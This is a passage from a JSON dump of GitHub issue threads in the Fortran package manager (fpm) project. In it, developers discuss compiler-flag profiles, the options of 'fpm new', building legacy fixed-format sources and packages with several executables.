                    "text": "Glad that fixed it!\nWe may potentially need an option to manually specify an include path or have a standard include folder (include/) which contains text inclusions; consider the case if you needed to use macros.h from both src/ and test/"
                },
                {
                    "user": "smeskos",
                    "date": "2020-07-07 19:46:06+00:00",
                    "text": "Thank you again. I am closing this."
                }
            ]
        },
        {
            "number": 112,
            "user": "smeskos",
            "date": "2020-07-07 12:39:16+00:00",
            "title": "Managing compiler flags",
            "text": "Is it possible to add/remove flags and reset back to defaults if needed?\nIs there an option to display flags (before building)? (eg. fpm show flags)",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-07 14:31:37+00:00",
                    "text": "@smeskos what flags do you have in mind? Compiler flags?"
                },
                {
                    "user": "smeskos",
                    "date": "2020-07-07 14:58:42+00:00",
                    "text": "Yes I mean compiler flangs."
                },
                {
                    "user": "certik",
                    "date": "2020-07-07 15:10:20+00:00",
                    "text": "I don't think it's possible currently, but we need to have it.\nProbably fpm.toml should allow to set flags for specific compilers per file.\nHowever, even more important is to extract common flags into general settings that work across compilers.\nWhat flags would you like to set @smeskos ?"
                },
                {
                    "user": "smeskos",
                    "date": "2020-07-07 15:22:19+00:00",
                    "text": "I would like to set -cpp, -Wconversion and -std=f2018.  But most importantly to suppress warnings (per case), eg. many times when I am still testing something and is under-development I set -Wno-uninitialized-variables and others as well, the reason is that I don't want to pollute the output with dozens non-relevant warnings."
                },
                {
                    "user": "LKedward",
                    "date": "2020-07-07 15:28:07+00:00",
                    "text": "+1 for customising compile flags for debug/release.\nAlso need an option for specifying link flags for linking against external libs like BLAS etc."
                },
                {
                    "user": "certik",
                    "date": "2020-07-07 15:29:00+00:00",
                    "text": "Ok, so let's take it on a case by case:\n\n\n-cpp should be done in a general manner as discussed in #78.\n\n\n-std=f2018 should also be done in a general manner (that works with all compilers), probably an fpm.toml setting such as \"standard = F2018\" or something like that.\n\n\nThe -Wconversion should be enabled by default, together with all other common warnings\n\n\n-Wno-uninitialized-variables this is the one where we need to allow to set a specific option per file. It could also be done from a command line.\n\n\nSo we need a general solution, but the most common use cases (such as 1., 2. and 3. above) should be abstracted out and fpm should know how to deal with those."
                },
                {
                    "user": "jerryd",
                    "date": "2020-08-11 23:39:59+00:00",
                    "text": "I need to include things like this on the compiler command line.  Right now this is a blocker for me.  Is it possible to set FC to a script to wrap around this:\n$(pkgconf --cflags --libs gtk-3-fortran)\nAs an example:\ngfortran -c $(pkgconf --cflags --libs gtk-3-fortran) mystuff.f90\nBeing able to invoke pkgconf is also important for many other complex libraries."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-08-12 22:51:07+00:00",
                    "text": "Although it would be preferable for fpm to do this more generically, I ran into similar issues and you can specify something like\nbuild-script = \"fpm.mk\"\nand then put a Makefile in fpm.mk.  I had to use that to build a library that contained dozens of C files and where I wanted the output to include a *.a static library instead of *.o files and needed X11 to be loaded in the executables, for example. There are some environment variables defined by fpm(1) as described in the fpm documentation that are helpful in placing the output files in the correct directories, as they go in different places when you use the --release option; for example.  M_system and M_draw have fpm.mk files, for example\nhttps://github.com/urbanjost/M_system.git\nhttps://github.com/urbanjost/M_draw.git\nAlthough I apparently did not follow the toml standard in my fpm.toml files (although they work with fpm(1)) which I am hopefully going to correct soon. Maybe not the ideal long-term solution, but works today."
                },
                {
                    "user": "jerryd",
                    "date": "2020-08-14 16:53:20+00:00",
                    "text": "It seems the simplest way to do this would to have FPM check for an environment variable such as $FFLAGS and just substitute those in or use it to override the default flags.  I have not looked at the FPM source code so I 'imagine' this would be straight forward to do"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-08 19:07:08+00:00",
                    "text": "Cargo uses profiles to define the compilation arguments: https://doc.rust-lang.org/cargo/reference/profiles.html\nWe could use a similar scheme to define arguments in fpm and make it extensible for additional compilation profiles (like coverage).\nJust as an example how the current release build mode could be expressed:\n[profile.release]\nfast-math = true\noptimization = 3\ndebug = false\nstandard = \"2008\"\nlto = false\npic = true\ncompile-args.gnu = [\"-funroll-loops\"]  # compiler id required for specifying arguments?\nThe command line could allow a --profile key to reference a defined profile, with debug or development being the default and release being a special profile selected by the --release argument."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-09 01:06:39+00:00",
                    "text": "Yes. The package ideally  has a self-contained definition file so when someone uses it as an external dependency it would build automatically so this seems like a good direction, but harder for Fortran than most other languages to implement.\nUsing switches on the command line is handy for a developer or someone not planning on distributing their package but is problematic otherwise, especially for anything that is intended to be used automatically as an external dependency by others.\nMulti-compiler support becomes difficult unless the keywords are something like a general name like \"coarray\" or \"X11\" and there are built-in defaults for how to implement that for each compiler, which quickly gets to be a maintenance problem past a few basic options.  Just wondering if the configuration files should be able to be in separate files so they can be shared and reused easily. I would not say that should be mandatory; but an option.\nSo I am trying to picture when I am using a number of external dependencies and maybe a math library is using coarrays and a graphics package is using X11 libraries and a TUI interface is using ncurses. It seems like external \"system\" load options should be inherited by the apps by default for loading?  It gets complicated because there are potentially many compilers with different options.  It would be nice if we had a generic load script and compile script for Fortran that was standardized, but right now if I just had something that let me say for \"ifort\" add these load options, and for \"gfortran\", \"f90\", ... add these it would eliminate my need for a fpm.mk file for several packages, which would be nice.\nI could live with the top package having to specify all the options but it would require any external package that depends on \"system\" libraries to always require manual editing of the main project manifest.\nSo I think there are still issues but being able to specify options in the manifest file seems the right direction; and being to distinguish between optional and required options might allow \"required\" options to be inherited by the top package.\nMaybe just like you have to add a line in your manifest for a dependency the dependency might be able to specify options as well?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-09 08:54:42+00:00",
                    "text": "We could use a similar scheme to define arguments in fpm and make it extensible for additional compilation profiles (like coverage)\n\nYes, this is very much how I envisaged the problem to be solved. This allows us to support multiple compilers and handle flag compatibility between dependencies but without restricting the general user. I think this is the solution we should pursue for managing compilers and flags. Importantly this will allow us to get something general and flexible working; any issues surrounding particular flags and compilers can then be addressed on a case-by-case basis.\n\nIn addition to \"coverage\" the other profile I use often would, perhaps confusingly, be \"profile\" for performance profiling."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-14 15:39:40+00:00",
                    "text": "An alternative proposal, we already have the build table, so we could put it in here:\n[build.config.release]\noptimization = 3\ndebug = false\n\n[build.config.debug-optimized]\noptimization = 2\ndebug = true\n\n[build.config.debug]\noptimization = 0\ndebug = true\n\n[build.config.coverage]\noptimization = 0\ndebug = true\n\n[build.config.profile]\noptimization = 2\ndebug = false\nThe idea would be to create a table in build containing our compilation profiles. This is the scope I'm envisioning for now:\n\nthe profiles can have any name, fpm allows to select them at runtime\nfpm defines release and debug profiles for GCC (this set can be extended in future)\nany dependency not defining a named profile will inherit the profile from the dependent\ninheritance of profile options is defined on per option basis (optimization is handled different than fast-math, and so forth)\ncompiler-specific options should be discussed separately (see #223)\n\nI'm also looking for a better synonym of profile; config, option or setting would be possible. Any suggestions or preferences?"
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-11-23 00:05:10+00:00",
                    "text": "Just as an example how the current release build mode could be expressed:\n[profile.release]\nfast-math = true\noptimization = 3\ndebug = false\nstandard = \"2008\"\nlto = false\npic = true\ncompile-args.gnu = [\"-funroll-loops\"]  # compiler id required for specifying arguments?\n\nI am not sure if the language standard makes sense as part of a profile."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-23 07:27:29+00:00",
                    "text": "I am not sure if the language standard makes sense as part of a profile.\n\nThere should be some way to specify it, in most projects I usually set the standard flag for debug builds and leave it out in the release, but specifying it globally in the [build] table would work as well."
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-11-27 11:19:02+00:00",
                    "text": "To aid the discussion I have tried to summarize some of the available optimization flags. Note that the specific optimizations will slightly differ between compilers. As a single example, to optimize for executable size, gfortran has the flag -Os, however the Intel documentation recommends using -O1.\n(perhaps this table can also be moved to a Wiki)\n\n\n\nFlag\ngfortran\nifort\nnagfor\nflang\nCray\nIBM\n\n\n\n\n-O\nequal to -O1\n/\nequal to -O2\nequal to -O2\n\nequal to -O2\n\n\n-O0\nno optimization (default)\nno optimization\nno optimization\ndisable optimization\ndisable optimization\ndisable optimization\n\n\n-O1\noptimize\noptimize for size\nminimal quick optimisation\nbetween -O0 and -O2\nconservative optimization\nno effect, reserved for future use\n\n\n-O2\noptimize even more\nmaximize speed (default)\nnormal optimisation (default)\nmoderate optimization\ndefault optimization\noptimize for performance\n\n\n-O3\noptimize yet more\nsimilar to -O2 with additional floating point optimizations\nfurther optimisation\nfull optimization\naggresive optimisation\nadditional optimization (similar to gfortran -Ofast)\n\n\n-O4\n/\n/\nmaximal optimisation\nreserved for future use\n/\naggresive optimization\n\n\n-O5\n/\n/\n/\n/\n/\nequal to -O4 with additional interprocedure analysis\n\n\n-Ofast\nsimilar to -O3 with unsafe math\n/\n/\nsimilar to -O3 with   further math optimizations\n/\n/\n\n\n-fast\n/\nmaximize speed across   entire program\n/\n/\n/\n/\n\n\n-Os\noptimize for size\n/\n/\nlike -O2 but reduces code   size\n/\n/\n\n\n-Oz\n/\n/\n/\nlike -Os, but reduces   code size further\n/\n/\n\n\n-Og\nturns on optimizations   which do not interfere with debugging\n/\n/\n/\n/\n/\n\n\n\nSince we are limited by the available compilers for CI, I would suggest to only handle the -O0, -O1, -O2, and -O3 flags for now, which are common for most Fortran compilers."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-04 15:12:57+00:00",
                    "text": "With #322 the package scope of the source files is now available in the fpm model, extending each package object in the fpm model by its compilation profile would allow to implement customized arguments on per package basis.\nThe main issue to solve is the presentation of the build arguments in the package manifest.\nI would suggest to use a table of tables either in build or in the top-level:\n[build.profile.*]  # with * = debug, release, ...\nThe command line argument could be --profile <debug|release|...> to access the compilation profile.\nWe should abstract as many options as possible in specific entries in a profile (optimization, fast-math, ...), but we won't get around implementing compiler vendor specific arguments. Again I would suggest to represent them with a table of tables:\n[build.profile.*]  # with * = debug, release, ...\n[build.profile.*.compile-args]  # link-args, global-args ?\ngnu = [\"...\", \"...\"]\nintel = [\"...\", \"...\"]  # Intel with GCC like CLI on Unix\nintel-cl = [\"...\", \"...\"]  # Intel with MSVS like CLI on Windows\nflang = [\"...\", \"...\"]\n# or inverted?\n[build.profile.*.gnu]\ncompile-args = [\"...\", \"...\"]\nlink-args = [\"...\", \"...\"]\nglobal-args = [\"...\", \"...\"]\nThe allowed IDs should preferably match existing IDs used in CMake or meson. Internally, all abstracted options could be implemented using the same representation as the compile-args table.\nWe will require three kinds of arguments, compile arguments for the current project (e.g. -O3), link arguments for the current project (e.g. -flto) and all dependent projects and global compile arguments for all dependent projects (e.g. -fopenmp, -fast-math). We can than fine-tune the exact scopes of the arguments at a later stage.\nImplementing the three different kind of arguments allows us to prototype profiles for the different compilers without having to modify fpm. Options and profiles we choose to stabilize in fpm can get specific entries in the profile or build tables later."
                },
                {
                    "user": "Sideboard",
                    "date": "2021-09-24 17:13:19+00:00",
                    "text": "Yes I mean compiler flangs.\n\nI was confused by the title of this issue. Could it be made more specific?"
                }
            ]
        },
        {
            "number": 111,
            "user": "certik",
            "date": "2020-07-06 20:09:15+00:00",
            "title": "Introduce --lib to initalize a project with a library",
            "text": "Currently this is the default, but there should be an option for the default value also (in addition I propose that this should not be the default in #109).",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-06 21:22:27+00:00",
                    "text": "I would combine this, #109, and #110 into a single issue, as these are all related.\nFor renaming the command line flags, I'm open to that. I tend to lean towards the more verbose to help make things more \"self documenting\", but understand that's not always the most popular way for everything.\nIn general, there are 3 (partially) independent pieces that fpm might create for a new project: src/project.f90, app/main.f90, and test/main.f90. Let's say the command line flags for each are --app, --lib, and --test.\nIf I understand correctly, you're suggesting that the default should be fpm new --app --lib name.\nIn order to not include an app, you'd then want a --no-app flag. So, should we have both flags, or just the ones for the opposite of the default? Having both would imply a total of 6 flags, each of which is mutually exclusive with the other; --app or --no-app, --lib or --no-lib, and --test or --no-test. But, we only really need the flags --no-app, --no-lib, and --test. And then a user can't actually specify contradictory flags, because there aren't any.\nExcept for one question. Should we allow fpm new --no-lib --test name? It doesn't actually break anything, but is kind of strange, because at that point what are you going to be testing?"
                },
                {
                    "user": "certik",
                    "date": "2020-07-06 22:16:39+00:00",
                    "text": "Good point. In Cargo, the --lib and --bin (as Cargo calls it) are mutually exclusive, so specifying --lib means no --bin.\nGiven the slight differences in Fortran and Rust and how modules are called, we can change this and figure out what makes sense for Fortran.\nBut the naming and default I think can be the same. \"fpm new\" would create the default app / executable. In addition, it can still create a library. Perhaps we'll always create a library, so perhaps --lib will always be on.\nAs long as:\nfpm new x\ncd x\nfpm run\n\nworks and executes the executable, then I am fine. The above I feel will be a very common workflow to test something out, whether to test out some library, or some Fortran construct, or some quick idea.\nI think you start a new Fortran library much less often. Sort of like writing a Python script vs starting a new Python library that you upload on pypi. I do the script much more often.\nLet's get an agreement on that first. Since you agree with the renaming of the options, those are the two main things I care about. We can discuss how exactly the --lib works later as we gain more experience with fpm."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-27 14:02:50+00:00",
                    "text": "I would prefer the default create all three, as they do not hurt anything and that you have one switch \"-with\" that can take the names app,test,lib that when specified only creates those elments, so the default would be\nfpm new -MYNAME  -with app,lib,test\nbut that if you just wanted the src/ directory as is the current default you would enter\nfpm new MYNAME -with lib\nor that there are three switches --lib --app and --test and if any of them is specified only specified ones are generated. So the default could be whatever but as soon as you said --lib the others would only be created if listed, so\nfpm new MYNAME # does whatever everyone wants to be the default\nfpm new MYNAME -lib  # only builds src/\nfpm new MYNAME -lib -app -test # builds all three\nI think the second is the most like other package managers.  I was thinking maybe there should just be a switch that takes a name, and there could be a name for each of the examples on the web page so you could enter something like\nfpm new MYNAME  project_with_library\nas  \"new\" (at least currently) only allows one directory name so a second name could be a \"type\". So something like\nfpm new  MYNAME lib test src  \nis another way to go\nI would have to reactivate short/long names in M_CLI2 or use another parser (but adding it back is trivial) but if\nyou went with the --lib --app --test you could have short names so\nfpm new MYNAME -lat\nMy personal favorite is\nfpm new  MYNAME # creates all three\nfpm  new MYNAME --lib --app # creates just src/ and app/\nand no shorter names. I tend to like descriptive names as well so when you find a command in a script it is self-descriptive. A private library I have allows short names by popular demand but only if you have a tty so you have to use long names in a batch job (which I have had more than one argument about :>)."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-02 02:20:07+00:00",
                    "text": "I would propose a PR that changes the new subcommand to the following to close #109, #110, and #111:\n   new(1) - the fpm(1) subcommand to initialize a new project\n\nSYNOPSIS\n fpm new NAME [--lib] [--app] [--test]\n\n fpm new --help|--version\n\nDESCRIPTION\n \"fpm new\" creates a new programming project in a new directory.\n\n The \"new\" subcommand creates a directory with the specified\n name and runs the command \"git init\" in that directory and\n populates it with an example \"fpm.toml\" file, a src/, test/,\n and app/ directory with trivial example Fortran source files\n and a \".gitignore\" file for ignoring the build/ directory\n where fpm-generated output will be placed:\n\n    NAME/\n      fpm.toml\n      .gitignore\n      src/\n          name.f90\n      app/\n          main.f90\n      test/\n          main.f90\n\n Remember to update the information in the sample \"fpm.toml\"\n file with such information as your name and e-mail address.\n\nOPTIONS\n NAME   the name of the project directory to create. The name\n        must be a valid Fortran name composed of 1 to 63\n        ASCII alphanumeric characters and underscores,\n        starting with a letter.\n\n The default is to create all of the src/, app/, and test/\n directories. If any of the following options are specified\n then only specified subdirectories are generated:\n\n --lib       create directory src/ and a placeholder module\n             named \"NAME.f90\" for use with subcommand \"build\".\n --app       create directory app/ and a placeholder main\n             program for use with subcommand \"run\".\n --test      create directory test/ and a placeholder program\n             for use with the subcommand \"test\".\n\n So the default is equivalent to \"fpm NAME --lib --app --test\".\n\n --help      print this help and exit\n --version   print program version information and exit\n\nEXAMPLES\n Sample use\n\n   fpm new myproject  # create new project directory and seed it\n   cd myproject       # Enter the new directory\n   # and run commands such as\n   fpm build\n   fpm run            # run example application program\n   fpm test           # run example test program\nSEE ALSO\n The fpm(1) home page at https://github.com/fortran-lang/fpm\n\n Registered packages are at https://fortran-lang.org/packages\n\nI would be making a PR only for the Fortran version assuming the pending \"NEW\" PR is accepted."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-02 16:57:26+00:00",
                    "text": "@urbanjost , I like your proposal. It's simple and understandable. As a note though, --test would essentially be useless without --lib (as I noted in my prior comment), because then there's no code to test. Should --test imply --lib or should we report an error, or maybe just a warning and create the project anyway?"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-02 18:54:45+00:00",
                    "text": "If you were refreshing a directory that already had src/ or app/ it could make sense.  I think if you have --test and src/ and app/ do not exist I think I would prefer a warning to an error,  but I suppose you could be in an existing package directory where the TOML file was used to create alternate directories to src/ and app/ so it might not be trivial to produce a warning only when there is no source or applications or other test directories but a warning would still be reasonable and would not have to be as rigourous as an error.  It is currently a difference between h-fpm and f-fpm that you can do \"fpm new myproject --lib\" and then\nlater do \"fpm new myproject --test\"  which is what I did as a new h-fpm user and got an error. This was before I knew much about how a project was even structured; as I now know I could have just done a \"mkdir /tmp\" and put a file in it called \"main.f90\" but as a first-time user I was confused; which was the motivation for making the tweek to allow the --test by itself;\nbut I can also see a new user doing something like \"fpm --test\". I have not tried that (will shortly) but I do realiize that just entering \"fpm new -app\" would create a test program with a missing module right now too. Maybe allowing a \"refresh\" wasn't as simple an idea as I thought. Mulling it a bit but a warning for both \"fpm -test\" and \"fpm -app\" when src/ does not exist seems like a minimal change needed. If \"fpm -app\" is done and src/ does not exist should it write a sample program with no use too? Never as simple as it seems."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-02 19:16:35+00:00",
                    "text": "Actually, I would expect fpm new to be an error if the folder already exists. For existing folders or fpm packages, I would expect to have commands fpm init or fpm reconfigure respectively.\nGood catch on fpm new --app. I would expect that to create a valid project though. Probably just:\nprogram project_name\n  implicit none\n\n  print *, \"Hello, project_name!\"\nend program"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-03 02:53:45+00:00",
                    "text": "With the current lack of the additional commands I am not sure which way to go. My personal experience is that the functionality is needed to work with an existing directory but I see the point that it might be better split  into mutlple\ncommands.\nBut after recently reviewing some other source package managers I prefer the current simplicity of the fpm(1) interface. Maybe it is inevitable that fpm(1) bloats as well if it becomes popular but I am torn between just disabling the ability to work with an existing directory for now and letting the project evolve new commands (the lack of that functionality was vexing to me when I was first moving projects to work with fpm(1)),\nPerhaps just making options for \"new\" like --update/-reconfigure and -init/-auto and just making the default be that the directory must not exist, that a switch like --update allow for a directory to exist but otherwise act like new is cleaner.\nLater something like -init/-auto could search an existing directory tree using the features recently added to build and write a new toml file describing what it finds . Maybe that really does deserve a seperate command, and it would be hard to differntiate between tests and demos and application programs if you assumed it would just conform to what it finds (so that is why I was thinking it would write a toml file which could be reorganized but would initially just put all programs under [executable] with a blank [test] that you could easily move files.\nIf no one wants \"new\" to work with existing directories I should turn it off as it would be hard to remove once people are used to it, but it would leave a hole in the functionality I consider basic. Just making the default be src/,test/,app/ would make it much less likely a new user would immediately hit the issue, I believe. That is based on the idea a new user is most likely to just enter \"fpm new\" and not try the switches until they got past the basics; which is only a hunch."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-03 03:48:44+00:00",
                    "text": "After trying a bunch of stuff I think init should be added at some point but that new  by default not allowing the directory to exist by default makes sense; but adding a -backfill switch that says new does exactly what it does with an empty directory but only creates missing files is a reasonable behavior that could stay permanent would satisfy\nyour expected behavior but allow for new to work with an existing directory (conservatively not replacing existing files so it does not overwrite the README.md file you spent all night on) to provide the functionality I do not want to see missing:\n ffpm new A --lib\n ffpm new A --app\n ffpm new A --app --backfill\n\nprovides\nffpm new A --lib\n + mkdir -p A\n + cd A\n + mkdir -p A/src\n + cd A;git init\nInitialized empty Git repository in /home/urbanjs/venus/V600/github/f-fpm/fpm/A/.git/\n\n+ ffpm new A --app\nfpm::new<ERROR> A already exists.\n        perhaps you wanted to add --backfill ?\n\n###+ ffpm new A --app --backfill\n + mkdir -p A\n + cd A\nfpm::new<WARNING> A/.gitignore already exists. Not overwriting\nfpm::new<WARNING> A/README.md already exists. Not overwriting\n + mkdir -p A/app\nfpm::new<WARNING> A/fpm.toml already exists. Not overwriting\n + cd A;git init\nReinitialized existing Git repository in /home/urbanjs/venus/V600/github/f-fpm/fpm/A/.git/\n[urbanjs@localhost fpm]$"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-03 04:05:52+00:00",
                    "text": "NAME\n   new(1) - the fpm(1) subcommand to initialize a new project\nSYNOPSIS\n fpm new NAME [--lib] [--app] [--test] [--backfill]\n\n fpm new --help|--version\n\nDESCRIPTION\n \"fpm new\" creates a new programming project in a new directory.\n\n The \"new\" subcommand creates a directory with the specified\n name and runs the command \"git init\" in that directory and\n populates it with an example \"fpm.toml\" file, a src/, test/,\n and app/ directory with trivial example Fortran source files\n and a \".gitignore\" file for ignoring the build/ directory\n (where fpm-generated output will be placed):\n\n    NAME/\n      fpm.toml\n      .gitignore\n      src/\n          NAME.f90\n      app/\n          main.f90\n      test/\n          main.f90\n\n Remember to update the information in the sample \"fpm.toml\"\n file with such information as your name and e-mail address.\n\nOPTIONS\n NAME   the name of the project directory to create. The name\n        must be a valid Fortran name composed of 1 to 63\n        ASCII alphanumeric characters and underscores,\n        starting with a letter.\n\n The default is to create all of the src/, app/, and test/\n directories. If any of the following options are specified\n then only specified subdirectories are generated:\n\n --lib       create directory src/ and a placeholder module\n             named \"NAME.f90\" for use with subcommand \"build\".\n --app       create directory app/ and a placeholder main\n             program for use with subcommand \"run\".\n --test      create directory test/ and a placeholder program\n             for use with the subcommand \"test\". Note that used\n             without --lib it does not really have anything to test.\n\n So the default is equivalent to \"fpm NAME --lib --app --test\".\n\n --backfill  By default the directory must not exist. If this\n             option is present the directory may pre-exist and\n             only subdirectories and files that do not\n             already exist will be created. For example, if you\n             previously entered \"fpm new myname -lib\" entering\n             \"fpm new myname -backfill\" will create the missing\n             app/ and test/ directories and missing programs.\n\n --help      print this help and exit\n --version   print program version information and exit\n\nEXAMPLES\n Sample use\n\n   fpm new myproject  # create new project directory and seed it\n   cd myproject       # Enter the new directory\n   # and run commands such as\n   fpm build\n   fpm run            # run example application program\n   fpm test           # run example test program\nSEE ALSO\n The fpm(1) home page at https://github.com/fortran-lang/fpm\n\n Registered packages are at https://fortran-lang.org/packages"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-04 15:38:23+00:00",
                    "text": "perhaps an out-of-the-box feature, but the intrinsic-manages page I had has a module built by a bash shell (in .gitignore) that converts the manpage source files into a module M_intrinsics that contains all the manpage text. In my own test version of fpm I was thinking that the \"fpm help\" syntax versus \"fpm --help\" which several package managers and git support could have supplemental text on usage and the toml file so I added that module to test with where you can enter an intrinsic name on the help command and get a plain-text display of the man page. A copy of M_intrinisics could easily be captured to keep it up to date or a snapshot could be included; but especially since non-*nix platforms do not have man(1) I thought I would mention it.\nIt also makes a good test for ANSI color sequences like in M_escape but I did not add the colorizer stuff. Essentially if the topic is not found by the help command instead of quitting it calls M_intrinsics. It allows the call to the intrinsics to be case-insensitive so if there is intrinsic called build you can still  get to the intrinsic description. \"fpm help build\" displays the fpm help for the build subcommand, but \"fpm help BUILD\" would display the intrinsic. I mention that here because I have a version that implements the changes mentioned above for review if there is no further discussion here that I could the manpages in. I could argue myself that is overloading, but it is a feature other package managers or methods do not provide that is reasonably useful. It says on the page to \"think outside of the box\", right?"
                }
            ]
        },
        {
            "number": 110,
            "user": "certik",
            "date": "2020-07-06 20:07:33+00:00",
            "title": "Rename --with-executable to --bin (or --app)",
            "text": "So that it is easier to type. Although in #109 I argue it should be the default.",
            "comments": []
        },
        {
            "number": 109,
            "user": "certik",
            "date": "2020-07-06 20:05:55+00:00",
            "title": "fpm new should do --with-executable by default",
            "text": "That is what Cargo does and what I also find intuitive. Very common when I want to just try something out in Fortran.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-02-03 23:11:14+00:00",
                    "text": "This is currently the default for Fortran fpm. I think we can close this as resolved."
                },
                {
                    "user": "certik",
                    "date": "2021-02-04 16:44:21+00:00",
                    "text": "Indeed, I just tested the latest version and it is fixed."
                }
            ]
        },
        {
            "number": 108,
            "user": "milancurcic",
            "date": "2020-06-24 16:15:59+00:00",
            "title": "rename reference to other fpm",
            "text": "Minor change to the README to not use the word \"effing\" when referring to the other fpm.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-06-24 16:26:59+00:00",
                    "text": "Merging as previously agreed on by @certik and @everythingfunctional ."
                },
                {
                    "user": "certik",
                    "date": "2020-06-24 16:28:03+00:00",
                    "text": "+1, thank you @milancurcic !"
                }
            ]
        },
        {
            "number": 107,
            "user": "ivan-pi",
            "date": "2020-06-21 15:21:22+00:00",
            "title": "Projects including legacy files",
            "text": "I've been trying to get fpm to work with some old-school packages like MINPACK: https://github.com/certik/minpack. These projects are generally just a bunch of fixed format \".f\" files. For modern applications that rely on such legacy codes, an interface module is the first step towards safe function calls.\nTrying to run fpm build on @certik's MINPACK fails with errors akin to:\nfpm build --release\n# gfortran (for build/gfortran_release/minpack/rwupdt.o build/gfortran_release/minpack/rwupdt.mod)\n# gfortran (for build/gfortran_release/minpack/dmchar.o build/gfortran_release/minpack/dmchar.mod)\n# gfortran (for build/gfortran_release/minpack/lmpar.o build/gfortran_release/minpack/lmpar.mod)\n# gfortran (for build/gfortran_release/minpack/hybrd.o build/gfortran_release/minpack/hybrd.mod)\nfpm: Error when running Shake build system:\n  at want, called at src/Build.hs:205:11 in fpm-0.1.0.0-ExRRX9W2aflLvTBBChPpxh:Build\n* Depends on: build/gfortran_release/minpack/libminpack.a\n  at need, called at src/Build.hs:203:13 in fpm-0.1.0.0-ExRRX9W2aflLvTBBChPpxh:Build\n* Depends on: build/gfortran_release/minpack/rwupdt.o\n  at &%>, called at src/Build.hs:183:11 in fpm-0.1.0.0-ExRRX9W2aflLvTBBChPpxh:Build\n* Depends on: build/gfortran_release/minpack/rwupdt.o build/gfortran_release/minpack/rwupdt.mod\n  at error, called at src/Development/Shake/Internal/Rules/Files.hs:245:13 in shake-0.18.5-44KSA7uQF2VObxzEvLYZx:Development.Shake.Internal.Rules.Files\n* Raised the exception:\nError, &%> rule failed to produce 1 file (out of 2)\n  build/gfortran_release/minpack/rwupdt.o\n  build/gfortran_release/minpack/rwupdt.mod - MISSING\n\nI understand that fpm is expecting to find a module file for each single \".f\" file. Is it possible to somehow work around this? The farthest I could get it in the fpm source was to remove to the \"-Wimplicit-interface\" flag which was creating lots of warnings \ud83d\ude48 .\nAm I right to think fpm is currently most suitable for projects composed of multiple module files?",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-06-22 07:55:04+00:00",
                    "text": "I was playing around with gtk-fortran and I found a work-around for non-module sources by renaming them to .in files so that fpm ignored them and including them with the include statement in a module.\nIt's not ideal and I'm not sure what the plan is for supporting non-module sources but I think they should be supported in some form.\nPerhaps the larger question is whether we will make fpm flexible enough to support legacy packages in their original form or require restructuring of such packages; this latter option is not as extreme as it sounds since for some packages, fpm support will be brought through a third-party fork anyway (i.e. not via the upstream repo)."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-22 21:47:46+00:00",
                    "text": "At the moment, fpm is only really targeted at projects with modules. At some point we may support non-module sources, but it may be some time before we get to it.\n@LKedward , clever workaround. I may even suggest that as a recommended migration path.\nIn the mean time, there is always the out that fpm now supports custom build scripts or Makefiles (with some specific requirements)."
                },
                {
                    "user": "certik",
                    "date": "2020-06-22 22:17:28+00:00",
                    "text": "We have to support non-module sources. But this might be a feature to put into the Fortran based fpm to keep the Haskell based on minimal to be used in bootstrapping."
                }
            ]
        },
        {
            "number": 105,
            "user": "ivan-pi",
            "date": "2020-06-21 09:20:09+00:00",
            "title": "Projects with multiple drivers",
            "text": "Following the discussion at the monthly call, I've installed fpm and am trying to convert a few of my Fortran projects to the recommended structure. These projects involve some legacy fixed-style functions and subroutines, an interface module, and several driver programs (tests). The folder structure is something like:\n.\n\u251c\u2500\u2500 drivers\n\u2502   \u251c\u2500\u2500 driver1.f90\n|   \u2514\u2500\u2500 driver2.f90\n\u251c\u2500\u2500 src\n\u2502   \u251c\u2500\u2500 legacy\n|   |   \u251c\u2500\u2500 legacy1.f\n|   |   \u2514\u2500\u2500 legacy2.f\n|   \u2514\u2500\u2500 interface.f90\n\u2514\u2500\u2500 fpm.toml\n\nDo I need to add multiple sections such as\n[[driver]]\nname = \"driver1\"\nsource-dir = \"drivers\"\nmain = \"driver1.f90\"\n\nto the TOML file? Right now my build just crashes because of multiple executable files.\nI think having multiple executable programs is a quite common type of package, say you have a library for building mesh triangulations, and then with it a small set of command line tools calling routines from this common library.\nAnother question is can I already specify dependencies on system-wide installed libraries. Say a project (or one of it's dependencies) needs to be linked with -llapack -lblas (with the actual LAPACK and BLAS libraries potentially in some non-default location). Does this fit under issue #99 of custom build scripts?\nI had a few other comments about the installation process, but they were already fixed in #101. A remaining point might be that after doing stack install in the fpm folder, the ${HOME}/.local/bin/ folder might not be on the path already, requiring an extra command export PATH=\"$PATH:$HOME/.local/bin/\".",
            "comments": [
                {
                    "user": "ivan-pi",
                    "date": "2020-06-21 13:50:08+00:00",
                    "text": "Here is the project I am trying to convert to be fpm-usable: https://github.com/ivan-pi/fortran_lsp/tree/fpm"
                },
                {
                    "user": "LKedward",
                    "date": "2020-06-22 07:34:25+00:00",
